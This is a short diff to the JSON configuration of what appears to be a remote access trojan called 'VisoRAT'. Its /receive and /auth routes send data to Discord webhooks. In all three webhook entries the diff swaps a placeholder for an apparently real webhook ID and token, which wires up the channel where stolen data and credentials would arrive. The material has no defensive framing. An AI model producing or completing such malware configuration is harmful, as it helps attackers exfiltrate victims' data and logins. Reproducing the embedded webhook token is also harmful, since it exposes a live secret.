@@ -8,14 +8,14 @@
         "/receive": {
             "webhooks": [
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                    "url": "1443385045137231932/R7FKaiFZQzyYuNqSJ4qRK8LWV7DlclxYHPi1e_NKp5rQPn6voa5VnAtDciB1b3eh_M60",
                     "name": "D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
 					"avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                 },
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE", 
+                    "url": "1443385045137231932/R7FKaiFZQzyYuNqSJ4qRK8LWV7DlclxYHPi1e_NKp5rQPn6voa5VnAtDciB1b3eh_M60", 
                     "name": "RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
@@ -26,7 +26,7 @@
         "/auth": {
             "webhooks": [
                 {
-                    "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
+                    "url": "1443385045137231932/R7FKaiFZQzyYuNqSJ4qRK8LWV7DlclxYHPi1e_NKp5rQPn6voa5VnAtDciB1b3eh_M60",
                     "name": "Not D Hooked RAT",
                     "footer": "VisoRAT",
                     "color": 7414964,
@@ -35,4 +35,5 @@
             ]
         }
     }
+
 }
